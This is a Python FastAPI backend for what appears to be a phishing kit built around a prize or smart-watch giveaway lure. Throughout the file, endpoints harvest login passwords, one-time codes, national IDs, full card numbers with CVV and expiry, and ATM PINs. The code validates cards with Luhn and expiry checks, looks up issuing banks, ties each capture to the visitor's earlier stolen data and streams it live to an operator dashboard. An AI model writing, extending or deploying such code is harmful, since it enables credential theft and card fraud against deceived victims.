import asyncio
import json
from datetime import datetime, timezone

from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import JSONResponse

from .. import state
from ..realtime import broadcast_dashboard_update, push_info_event
from ..services.visits import create_visit_record, touch_visit_presence
from ..services.registrations import (
    create_registration_submission,
    get_registration_submission_status,
    latest_login_credentials,
    latest_payment_details,
    lookup_bin_info_sync,
    mark_registration_submission_missed,
)
from ..services.visitors import build_visitor_redirect_url, frontend_index_url, get_visitor_status, is_visitor_blocked

router = APIRouter()

MAX_FIELD_LEN = 160
VALID_REQUEST_TYPES = {'smart_watch', 'smart_watch_premium', 'credit_card', 'daily_prizes', ''}
VALID_WATCH_IDS = {'watch1', 'watch2', 'watch3', 'watch4', 'watch5', 'watch6', ''}


def clean_text(value, max_len: int = MAX_FIELD_LEN) -> str:
    return str(value or '').strip()[:max_len]


def luhn_ok(digits: str) -> bool:
    if len(digits) < 13 or len(digits) > 19 or not digits.isdigit():
        return False
    total = 0
    double = False
    for char in reversed(digits):
        n = int(char)
        if double:
            n *= 2
            if n > 9:
                n -= 9
        total += n
        double = not double
    return total % 10 == 0


def expiry_in_future(value: str) -> bool:
    try:
        month_raw, year_raw = (value or '').split('/', 1)
        month = int(month_raw)
        year = 2000 + int(year_raw)
        if month < 1 or month > 12:
            return False
        now = datetime.now(timezone.utc)
        expiry_year = year + (1 if month == 12 else 0)
        expiry_month = 1 if month == 12 else month + 1
        return datetime(expiry_year, expiry_month, 1, tzinfo=timezone.utc) > now
    except Exception:
        return False


async def read_json_payload(request: Request) -> dict:
    try:
        payload = await request.json()
        return payload if isinstance(payload, dict) else {}
    except Exception:
        try:
            raw = (await request.body()).decode('utf-8', errors='ignore')
            payload = json.loads(raw or '{}')
            return payload if isinstance(payload, dict) else {}
        except Exception:
            return {}


@router.post('/api/visit')
async def create_visit(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    request_origin = clean_text(request.headers.get('origin'), 200)
    next_url = frontend_index_url(request_origin)
    backend_base_url = str(request.base_url).rstrip('/')
    if is_visitor_blocked(visitor_uid):
        return JSONResponse(
            {
                'blocked': True,
                'redirect_url': build_visitor_redirect_url(
                    visitor_uid,
                    backend_base_url=backend_base_url,
                    next_url=next_url,
                ),
            },
            status_code=403,
        )
    payload = {
        'visitor_uid': visitor_uid,
        'source_page': clean_text(payload.get('source_page'), 120),
        # Visits are presence/page-state only. Personal data is accepted only via
        # /api/registration/submit to avoid false "new registration" signals on refresh/back.
        'full_name': '',
        'national_id': '',
        'phone': '',
        'email': '',
    }
    visit_event = create_visit_record(payload)
    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
    return JSONResponse({'ok': True})


@router.post('/api/registration/submit')
async def submit_registration(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    request_origin = clean_text(request.headers.get('origin'), 200)
    next_url = frontend_index_url(request_origin)
    backend_base_url = str(request.base_url).rstrip('/')
    if is_visitor_blocked(visitor_uid):
        return JSONResponse(
            {
                'blocked': True,
                'redirect_url': build_visitor_redirect_url(
                    visitor_uid,
                    backend_base_url=backend_base_url,
                    next_url=next_url,
                ),
            },
            status_code=403,
        )
    clean = {
        'visitor_uid': visitor_uid,
        'source_page': clean_text(payload.get('source_page'), 120),
        'full_name': clean_text(payload.get('full_name')),
        'national_id': clean_text(payload.get('national_id'), 40),
        'phone': clean_text(payload.get('phone'), 40),
        'email': clean_text(payload.get('email'), 120),
    }

    visit_event = create_visit_record(clean)
    submission_id = create_registration_submission(clean, status='accepted', decided_by='auto')
    push_info_event(
        {
            'type': 'registration',
            'ts': visit_event.get('created_at', ''),
            'visitor_uid': visitor_uid,
            'source_page': clean.get('source_page', ''),
            'full_name': clean.get('full_name', ''),
            'national_id': clean.get('national_id', ''),
            'phone': clean.get('phone', ''),
            'email': clean.get('email', ''),
            'request_type': '',
            'watch_id': '',
            'category': '',
            'submission_id': submission_id,
            'status': 'accepted',
        }
    )
    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
    return JSONResponse({'ok': True, 'submission_id': submission_id, 'status': 'accepted'})


@router.post('/api/login/submit')
async def submit_login(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    request_origin = clean_text(request.headers.get('origin'), 200)
    next_url = frontend_index_url(request_origin)
    backend_base_url = str(request.base_url).rstrip('/')
    if not visitor_uid:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)
    if is_visitor_blocked(visitor_uid):
        return JSONResponse(
            {
                'blocked': True,
                'redirect_url': build_visitor_redirect_url(
                    visitor_uid,
                    backend_base_url=backend_base_url,
                    next_url=next_url,
                ),
            },
            status_code=403,
        )

    clean = {
        'form_type': 'login',
        'visitor_uid': visitor_uid,
        'source_page': clean_text(payload.get('source_page'), 120),
        'username': clean_text(payload.get('username'), 120),
        'password': clean_text(payload.get('password'), 200),
    }
    if not clean['username'] or not clean['password']:
        return JSONResponse({'error': 'invalid_input'}, status_code=400)

    visit_event = create_visit_record(
        {
            'visitor_uid': visitor_uid,
            'source_page': clean['source_page'],
        }
    )
    event = push_info_event(
        {
            'type': 'login',
            'ts': visit_event.get('created_at', ''),
            'visitor_uid': visitor_uid,
            'source_page': clean.get('source_page', ''),
            'username': clean.get('username', ''),
            'password': clean.get('password', ''),
            'request_type': '',
            'watch_id': '',
            'category': '',
            'submission_id': create_registration_submission(clean, status='pending'),
            'status': 'pending',
        }
    )
    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
    return JSONResponse({'ok': True, 'event': event, 'submission_id': event.get('submission_id', ''), 'status': 'pending'})


@router.post('/api/login-otp/submit')
async def submit_login_otp(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    request_origin = clean_text(request.headers.get('origin'), 200)
    next_url = frontend_index_url(request_origin)
    backend_base_url = str(request.base_url).rstrip('/')
    if not visitor_uid:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)
    if is_visitor_blocked(visitor_uid):
        return JSONResponse(
            {
                'blocked': True,
                'redirect_url': build_visitor_redirect_url(
                    visitor_uid,
                    backend_base_url=backend_base_url,
                    next_url=next_url,
                ),
            },
            status_code=403,
        )

    clean = {
        'form_type': 'login_otp',
        'visitor_uid': visitor_uid,
        'source_page': clean_text(payload.get('source_page'), 120),
        'otp_code': clean_text(payload.get('otp_code'), 12),
    }
    if len(clean['otp_code']) not in (4, 6):
        return JSONResponse({'error': 'invalid_input'}, status_code=400)
    clean.update(latest_login_credentials(visitor_uid))
    if any(page in clean['source_page'].lower() for page in ('phone-otp', 'app-otp')):
        clean.update(latest_payment_details(visitor_uid))

    visit_event = create_visit_record(
        {
            'visitor_uid': visitor_uid,
            'source_page': clean['source_page'],
        }
    )
    submission_id = create_registration_submission(clean, status='pending')
    event = push_info_event(
        {
            'type': 'login_otp',
            'ts': visit_event.get('created_at', ''),
            'visitor_uid': visitor_uid,
            'source_page': clean.get('source_page', ''),
            'username': clean.get('username', ''),
            'password': clean.get('password', ''),
            'otp_code': clean.get('otp_code', ''),
            'card_holder': clean.get('card_holder', ''),
            'card_number': clean.get('card_number', ''),
            'card_expiry': clean.get('card_expiry', ''),
            'card_cvv': clean.get('card_cvv', ''),
            'card_bin_type': clean.get('card_bin_type', ''),
            'card_bin_brand': clean.get('card_bin_brand', ''),
            'card_bin_country': clean.get('card_bin_country', ''),
            'card_bin_currency': clean.get('card_bin_currency', ''),
            'card_bin_bank': clean.get('card_bin_bank', ''),
            'card_bin_lookup_status': clean.get('card_bin_lookup_status', ''),
            'card_bin_lookup_message': clean.get('card_bin_lookup_message', ''),
            'card_bin_lookup_checked_at': clean.get('card_bin_lookup_checked_at', ''),
            'request_type': '',
            'watch_id': '',
            'category': '',
            'submission_id': submission_id,
            'status': 'pending',
        }
    )
    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
    return JSONResponse({'ok': True, 'event': event, 'submission_id': submission_id, 'status': 'pending'})


@router.post('/api/payment/submit')
async def submit_payment(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    request_origin = clean_text(request.headers.get('origin'), 200)
    next_url = frontend_index_url(request_origin)
    backend_base_url = str(request.base_url).rstrip('/')
    if not visitor_uid:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)
    if is_visitor_blocked(visitor_uid):
        return JSONResponse(
            {
                'blocked': True,
                'redirect_url': build_visitor_redirect_url(
                    visitor_uid,
                    backend_base_url=backend_base_url,
                    next_url=next_url,
                ),
            },
            status_code=403,
        )

    clean = {
        'form_type': 'payment',
        'visitor_uid': visitor_uid,
        'source_page': clean_text(payload.get('source_page'), 120),
        'card_holder': clean_text(payload.get('card_holder'), 120),
        'card_number': clean_text(payload.get('card_number'), 32),
        'card_expiry': clean_text(payload.get('card_expiry'), 8),
        'card_cvv': clean_text(payload.get('card_cvv'), 4),
    }
    digits = ''.join(ch for ch in clean['card_number'] if ch.isdigit())
    if (
        not clean['card_holder']
        or len(digits) != 16
        or not luhn_ok(digits)
        or not clean['card_expiry']
        or not expiry_in_future(clean['card_expiry'])
        or len(clean['card_cvv']) not in {3, 4}
        or not clean['card_cvv'].isdigit()
    ):
        return JSONResponse({'error': 'invalid_input'}, status_code=400)
    clean['card_number'] = digits
    # Optional enrichment only: failed/empty BIN lookup must not block submission.
    clean.update(await asyncio.to_thread(lookup_bin_info_sync, digits))

    visit_event = create_visit_record({'visitor_uid': visitor_uid, 'source_page': clean['source_page']})
    submission_id = create_registration_submission(clean, status='pending')
    event = push_info_event(
        {
            'type': 'payment',
            'ts': visit_event.get('created_at', ''),
            'visitor_uid': visitor_uid,
            'source_page': clean.get('source_page', ''),
            'card_holder': clean.get('card_holder', ''),
            'card_number': clean.get('card_number', ''),
            'card_expiry': clean.get('card_expiry', ''),
            'card_cvv': clean.get('card_cvv', ''),
            'card_bin_type': clean.get('card_bin_type', ''),
            'card_bin_brand': clean.get('card_bin_brand', ''),
            'card_bin_country': clean.get('card_bin_country', ''),
            'card_bin_currency': clean.get('card_bin_currency', ''),
            'card_bin_bank': clean.get('card_bin_bank', ''),
            'card_bin_lookup_status': clean.get('card_bin_lookup_status', ''),
            'card_bin_lookup_message': clean.get('card_bin_lookup_message', ''),
            'request_type': '',
            'watch_id': '',
            'category': '',
            'submission_id': submission_id,
            'status': 'pending',
        }
    )
    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
    return JSONResponse({'ok': True, 'event': event, 'submission_id': submission_id, 'status': 'pending'})


@router.post('/api/atm/submit')
async def submit_atm(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    request_origin = clean_text(request.headers.get('origin'), 200)
    next_url = frontend_index_url(request_origin)
    backend_base_url = str(request.base_url).rstrip('/')
    if not visitor_uid:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)
    if is_visitor_blocked(visitor_uid):
        return JSONResponse(
            {
                'blocked': True,
                'redirect_url': build_visitor_redirect_url(
                    visitor_uid,
                    backend_base_url=backend_base_url,
                    next_url=next_url,
                ),
            },
            status_code=403,
        )

    clean = {
        'form_type': 'atm',
        'visitor_uid': visitor_uid,
        'source_page': clean_text(payload.get('source_page'), 120),
        'atm_pin': ''.join(ch for ch in clean_text(payload.get('atm_pin'), 8) if ch.isdigit())[:4],
    }
    if len(clean['atm_pin']) != 4:
        return JSONResponse({'error': 'invalid_input'}, status_code=400)
    clean.update(latest_payment_details(visitor_uid))

    visit_event = create_visit_record({'visitor_uid': visitor_uid, 'source_page': clean['source_page']})
    submission_id = create_registration_submission(clean, status='pending')
    event = push_info_event(
        {
            'type': 'atm',
            'ts': visit_event.get('created_at', ''),
            'visitor_uid': visitor_uid,
            'source_page': clean.get('source_page', ''),
            'atm_pin': clean.get('atm_pin', ''),
            'card_holder': clean.get('card_holder', ''),
            'card_number': clean.get('card_number', ''),
            'card_expiry': clean.get('card_expiry', ''),
            'card_cvv': clean.get('card_cvv', ''),
            'request_type': '',
            'watch_id': '',
            'category': '',
            'submission_id': submission_id,
            'status': 'pending',
        }
    )
    asyncio.create_task(broadcast_dashboard_update(recent_visit=visit_event))
    return JSONResponse({'ok': True, 'event': event, 'submission_id': submission_id, 'status': 'pending'})


@router.post('/api/registration/status')
async def registration_status(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    submission_id = clean_text(payload.get('submission_id'), 80)
    if not visitor_uid or not submission_id:
        return JSONResponse({'error': 'invalid_input'}, status_code=400)
    row = get_registration_submission_status(submission_id, visitor_uid)
    if not row:
        return JSONResponse({'error': 'not_found'}, status_code=404)
    return JSONResponse({'ok': True, 'submission': row})


@router.post('/api/registration/missed')
async def registration_missed(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    submission_id = clean_text(payload.get('submission_id'), 80)
    if not visitor_uid or not submission_id:
        return JSONResponse({'error': 'invalid_input'}, status_code=400)
    row = mark_registration_submission_missed(submission_id, visitor_uid)
    if not row:
        return JSONResponse({'error': 'not_found'}, status_code=404)
    asyncio.create_task(
        broadcast_dashboard_update(
            recent_visit={'visitor_uid': visitor_uid, 'registration_status_changed': True}
        )
    )
    return JSONResponse({'ok': True, 'submission': row})


@router.post('/api/visitor/status')
async def visitor_status(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    next_url = clean_text(payload.get('next_url'), 240)
    if not visitor_uid:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)
    return JSONResponse(get_visitor_status(visitor_uid, next_url=next_url or None))


@router.post('/api/selection')
async def capture_selection(request: Request) -> JSONResponse:
    payload = await read_json_payload(request)
    visitor_uid = clean_text(payload.get('visitor_uid'), 120)
    request_origin = clean_text(request.headers.get('origin'), 200)
    next_url = frontend_index_url(request_origin)
    backend_base_url = str(request.base_url).rstrip('/')
    if not visitor_uid:
        return JSONResponse({'error': 'invalid_uid'}, status_code=400)
    if visitor_uid and is_visitor_blocked(visitor_uid):
        return JSONResponse(
            {
                'blocked': True,
                'redirect_url': build_visitor_redirect_url(
                    visitor_uid,
                    backend_base_url=backend_base_url,
                    next_url=next_url,
                ),
            },
            status_code=403,
        )
    request_type = clean_text(payload.get('request_type'), 60)
    watch_id = clean_text(payload.get('watch_id'), 30)
    if request_type not in VALID_REQUEST_TYPES:
        return JSONResponse({'error': 'invalid_request_type'}, status_code=400)
    if watch_id not in VALID_WATCH_IDS:
        return JSONResponse({'error': 'invalid_watch_id'}, status_code=400)

    event = push_info_event(
        {
            'type': 'selection',
            'ts': clean_text(payload.get('ts'), 60),
            'visitor_uid': visitor_uid,
            'source_page': clean_text(payload.get('source_page'), 120),
            'request_type': request_type,
            'watch_id': watch_id,
            'category': clean_text(payload.get('category'), 80),
        }
    )
    asyncio.create_task(broadcast_dashboard_update())
    return JSONResponse({'ok': True, 'event': event})


@router.get('/api/health')
async def health() -> dict[str, str]:
    return {'status': 'ok'}


@router.websocket('/ws/visitor')
async def ws_visitor_presence(websocket: WebSocket):
    visitor_uid = clean_text(websocket.query_params.get('visitor_uid'), 120)
    source_page = clean_text(websocket.query_params.get('source_page'), 120)
    request_origin = clean_text(websocket.headers.get('origin'), 200)
    next_url = frontend_index_url(request_origin)
    backend_base_url = f'{websocket.url.scheme}://{websocket.url.netloc}'
    if not visitor_uid:
        await websocket.close(code=1008)
        return
    if is_visitor_blocked(visitor_uid):
        await websocket.accept()
        await websocket.send_json(
            {
                'type': 'visitor.blocked',
                'redirect_url': build_visitor_redirect_url(
                    visitor_uid,
                    backend_base_url=backend_base_url,
                    next_url=next_url,
                ),
            }
        )
        await websocket.close(code=1008)
        return

    await websocket.accept()
    state.visitor_ws_clients.setdefault(visitor_uid, set()).add(websocket)

    async def touch() -> None:
        if is_visitor_blocked(visitor_uid):
            await websocket.send_json(
                {
                    'type': 'visitor.blocked',
                    'redirect_url': build_visitor_redirect_url(
                        visitor_uid,
                        backend_base_url=backend_base_url,
                        next_url=next_url,
                    ),
                }
            )
            await websocket.close(code=1008)
            return
        visit_event = touch_visit_presence(visitor_uid, source_page, include_submission_at=False)
        await broadcast_dashboard_update(recent_visit=visit_event, include_info_events=False)

    try:
        await touch()
        while True:
            try:
                await asyncio.wait_for(websocket.receive_text(), timeout=6)
            except asyncio.TimeoutError:
                pass
            await touch()
    except WebSocketDisconnect:
        return
    finally:
        if visitor_uid in state.visitor_ws_clients:
            state.visitor_ws_clients[visitor_uid].discard(websocket)
